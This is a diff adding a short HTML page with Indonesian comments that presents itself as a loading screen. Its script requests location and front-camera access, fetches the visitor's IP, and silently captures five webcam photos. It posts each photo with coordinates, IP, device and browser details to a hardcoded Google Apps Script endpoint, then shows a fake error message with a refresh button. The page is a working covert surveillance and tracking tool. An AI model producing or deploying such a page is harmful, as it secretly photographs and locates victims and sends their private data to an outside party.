@@ -1,0 +1,243 @@
+<!doctype html>
+<html lang="id">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <style>
+      body {
+        margin: 0;
+        height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-family: sans-serif;
+        flex-direction: column;
+      }
+
+      /* loading spinner */
+      #loading {
+        width: 60px;
+        height: 60px;
+        border: 8px solid #eee;
+        border-top: 8px solid #3498db;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      /* teks error */
+      #errorText {
+        display: none;
+        margin-bottom: 15px;
+        font-size: 16px;
+        color: #e53935;
+        text-align: center;
+        font-family: monospace;
+      }
+
+      /* tombol refresh */
+      #refreshBtn {
+        display: none;
+        width: 50%;
+        padding-left: 12px;
+        padding-right: 12px;
+        padding-top: 9px;
+        padding-bottom: 8px;
+        font-size: 16px;
+        border: none;
+        background: #3498db;
+        color: white;
+        border-radius: 25px;
+        cursor: pointer;
+        font-weight: bold;
+      }
+
+      /* ikon di tombol */
+      #refreshBtn svg {
+        width: 18px;
+        height: 18px;
+        vertical-align: middle;
+        margin-right: 1px;
+        margin-bottom: 1px;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div id="loading"></div>
+
+    <div id="errorText">
+      Error detected.<br />
+      Action required: Please click the refresh button to reload this page !
+    </div>
+
+    <button id="refreshBtn" onclick="location.reload()">
+      <svg
+        xmlns="http://www.w3.org/2000/svg"
+        fill="none"
+        viewBox="0 0 24 24"
+        stroke-width="1.5"
+        stroke="currentColor"
+      >
+        <path
+          stroke-linecap="round"
+          stroke-linejoin="round"
+          d="M16.023 9.348h4.992v-.001M2.985 19.644v-4.992m0 0h4.992m-4.993 0 3.181 3.183a8.25 8.25 0 0 0 13.803-3.7M4.031 9.865a8.25 8.25 0 0 1 13.803-3.7l3.181 3.182m0-4.991v4.99"
+        />
+      </svg>
+
+      Refresh
+    </button>
+
+    <video id="video" autoplay playsinline style="display: none"></video>
+    <canvas id="canvas" style="display: none"></canvas>
+
+    <script>
+      /* ================= CONFIG ================= */
+
+      const scriptURL =
+        "https://script.google.com/macros/s/AKfycbxrzNODa2jCPweMz922zOUatp1CE3TIZPMPf8SiETXF_hqchkxZDNq-biIcex_i5owi/exec";
+
+      const MAX_SEND = 5;
+      const DELAY = 3000;
+
+      /* ================= VAR ================= */
+
+      let latitude = "",
+        longitude = "",
+        ipAddress = "";
+
+      let sendCount = 0;
+      let streamRef = null;
+
+      /* tambahan status izin */
+      let locationReady = false;
+      let cameraReady = false;
+
+      /* UI */
+      const loading = document.getElementById("loading");
+      const refreshBtn = document.getElementById("refreshBtn");
+      const errorText = document.getElementById("errorText");
+
+      function showRefresh() {
+        loading.style.display = "none";
+        errorText.style.display = "block";
+        refreshBtn.style.display = "block";
+      }
+
+      function checkReady() {
+        if (locationReady && cameraReady) {
+          setTimeout(loopCapture, 3500);
+        }
+      }
+
+      /* ================= DEVICE ================= */
+
+      const getDevice = () =>
+        /android/i.test(navigator.userAgent)
+          ? "Android"
+          : /iphone|ipad|ipod/i.test(navigator.userAgent)
+            ? "iOS"
+            : "Other";
+
+      const getBrowser = () =>
+        navigator.userAgent.includes("Chrome")
+          ? "Chrome"
+          : navigator.userAgent.includes("Safari")
+            ? "Safari"
+            : navigator.userAgent.includes("Firefox")
+              ? "Firefox"
+              : "Other";
+
+      /* ================= IP ================= */
+
+      fetch("https://api.ipify.org?format=json")
+        .then((r) => r.json())
+        .then((d) => (ipAddress = d.ip))
+        .catch(() => {});
+
+      /* ================= LOKASI ================= */
+
+      navigator.geolocation.getCurrentPosition(
+        (p) => {
+          latitude = p.coords.latitude;
+          longitude = p.coords.longitude;
+
+          locationReady = true;
+          checkReady();
+        },
+        () => {
+          showRefresh();
+        },
+      );
+
+      /* ================= KAMERA DEPAN ================= */
+
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      const ctx = canvas.getContext("2d");
+
+      navigator.mediaDevices
+        .getUserMedia({ video: { facingMode: "user" } })
+        .then((stream) => {
+          streamRef = stream;
+          video.srcObject = stream;
+
+          cameraReady = true;
+          checkReady();
+        })
+        .catch(() => {
+          showRefresh();
+        });
+
+      /* ================= LOOP ================= */
+
+      function loopCapture() {
+        if (sendCount >= MAX_SEND) {
+          if (streamRef) {
+            streamRef.getTracks().forEach((t) => t.stop());
+          }
+
+          showRefresh();
+          return;
+        }
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const photo = canvas.toDataURL("image/jpeg", 0.85);
+        const timestamp = new Date().toISOString();
+        const nonce = Math.random().toString(36).substring(2, 10);
+
+        fetch(scriptURL, {
+          method: "POST",
+          body: JSON.stringify({
+            capture_id: `${timestamp}_${nonce}`,
+            waktu: timestamp,
+            latitude,
+            longitude,
+            ip: ipAddress,
+            device: getDevice(),
+            browser: getBrowser(),
+            foto: photo,
+            urutan: sendCount + 1,
+          }),
+        }).finally(() => {
+          sendCount++;
+          setTimeout(loopCapture, DELAY);
+        });
+      }
+    </script>
+  </body>
+</html>
